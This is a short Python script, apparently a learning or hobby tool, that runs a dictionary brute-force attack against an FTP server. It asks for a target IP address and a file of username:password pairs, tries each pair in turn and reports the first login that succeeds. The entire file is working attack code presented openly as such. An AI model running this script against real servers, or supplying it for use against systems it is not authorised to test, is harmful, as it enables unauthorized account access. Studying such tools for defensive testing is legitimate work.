#!/usr/bin/python3
#FTP login Bruteforce attack on given host using a
#.txt file to search for a username and password. 

import ftplib

def connect(hostname, passwdfile):
    try:
        with open(passwdfile) as pF:
            for line in pF.readlines():
                username = line.split(':')[0]
                password = line.split(':')[1].strip('\n')
                print(f"Trying to log in with {username} / {password}")
                try:
                    ftp = ftplib.FTP(hostname)
                    ftp.login(username, password)
                    print(f"[+] Login succesful with: {username} / {password}")
                    ftp.quit()
                    return(username, password)
                except:
                    pass
            print("[-] username and password not found in file")
    except(FileNotFoundError, IOError):
        print("file not found. or file permition denied")    
        
   
host = input("[*] Enter ip Address: ")
passwdfile = input("[*] Enter .txt file with usernames and passwords: ")
connect(host, passwdfile)